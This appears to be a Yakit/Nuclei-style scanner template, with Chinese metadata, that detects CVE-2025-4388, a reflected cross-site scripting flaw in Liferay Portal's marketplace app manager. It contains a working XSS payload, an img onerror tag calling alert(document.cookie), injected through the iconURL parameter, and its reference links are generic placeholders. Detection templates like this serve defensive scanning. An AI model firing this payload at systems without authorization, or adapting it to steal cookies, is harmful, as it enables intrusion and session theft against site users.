content:
id: CVE-2025-4388

info:
  name: LiferayPortal 反射xss漏洞
  author: Deans
  severity: high
  description: Liferay Portal 在特定版本中存在一个反映的跨站脚本 （XSS） 漏洞，允许未经身份验证的远程攻击者将 JavaScript 注入 modules/apps/marketplace/marketplace-app-manager-web。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 451a6b3fdd941de8613afa101d6747f6

http:
- raw:
  - |+
    @timeout: 30s
    GET /o/marketplace-app-manager-web/icon.jsp?iconURL=https:///%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E HTTP/1.1
    Host: {{Hostname}}


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    words:
    - alert(document.cookie)
    - onerror=
    - alt="thumbnail"
    condition: and

  - type: status
    status:
    - 200
    condition: and
